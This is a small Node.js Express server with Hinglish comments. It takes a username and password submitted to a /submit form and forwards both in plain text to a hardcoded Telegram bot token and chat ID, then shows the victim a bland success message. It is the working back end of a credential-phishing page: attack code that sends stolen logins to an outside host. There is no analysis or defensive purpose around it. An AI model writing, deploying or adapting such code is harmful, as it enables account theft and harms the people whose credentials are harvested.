const express = require('express');
const https = require('https');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const TELEGRAM_BOT_TOKEN = '8876457882:AAFvczJKXLDbXzS9BiNmgu7czyV8vQkOZWw';
const TELEGRAM_CHAT_ID = '7611064372';

app.post('/submit', (req, res) => {
    const { username, password } = req.body;
    
    // Telegram ka URL jahan data bhejna hai
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=Username: ${username} Password: ${password}`;

    https.get(url, (telegramRes) => {
        let data = '';
        telegramRes.on('data', (chunk) => {
            data += chunk;
        });
        telegramRes.on('end', () => {
            console.log("Telegram Response:", data);
        });
    }).on('error', (err) => {
        console.log("Error:", err.message);
    });

    res.send('Form successfully submit ho gaya hai!');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});